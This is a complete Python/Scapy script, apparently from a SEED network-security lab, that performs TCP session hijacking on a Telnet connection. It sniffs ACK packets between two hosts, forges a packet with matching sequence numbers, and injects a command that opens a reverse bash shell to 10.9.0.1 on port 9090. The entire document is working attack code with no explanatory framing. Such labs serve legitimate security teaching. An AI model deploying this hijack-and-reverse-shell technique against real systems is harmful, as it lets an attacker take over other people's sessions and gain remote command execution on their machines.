#!/usr/bin/env python3
import sys
from scapy.all import *

def spoof(pkt):
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
  
    #TCP data length
    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4

    ip = IP(src = old_ip.src, dst = old_ip.dst)
    tcp = TCP(sport = old_tcp.sport, dport = old_tcp.dport, flags = "A",
            seq = old_tcp.seq+1, ack = old_tcp.ack+1)
    #data = "\r touch /home/seed/hijackAuto.txt\r"
    data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
  
    print(".....SENDING SESSION HIJACKING PACKET.....")
    pkt = ip/tcp/data
    send(pkt, verbose=0)
    ls(pkt)
    quit()

myFilter = 'tcp[tcpflags] & tcp-ack != 0 and src host 10.9.0.6 and dst host 10.9.0.5 and dst port 23'
sniff(iface='br-58c05ab21c23', filter=myFilter, prn=spoof)
